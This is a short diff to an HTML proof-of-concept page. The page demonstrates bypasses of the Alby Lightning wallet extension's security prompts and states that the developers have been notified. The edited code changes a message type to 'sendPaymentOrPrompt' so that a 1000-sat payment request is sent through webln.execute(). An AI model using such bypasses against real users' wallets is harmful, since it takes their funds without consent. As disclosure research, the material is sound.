@@ -35,7 +35,7 @@
             application: "LBE",
             prompt: true,
             action: "sendPayment",
-            type: "enable",
+            type: "sendPaymentOrPrompt",
             args: {
               paymentRequest: await getInvoice(1000),
             },
@@ -55,6 +55,7 @@
     <h1>Alby vulnerabilities PoC</h1>
     This page demonstrates a few ways to bypass <a href="https://getalby.com">Alby</a>'s security features.
     The development team is informed and these issues will be fixed soon.
+    Currently, there is no direct confirmation if a payment failed or worked.
     <section class="container">
       <h3>Alby 1.7.0 and below</h3>
       <button onclick="sendUsingWebLnExec();">Send using webln.execute()</button>
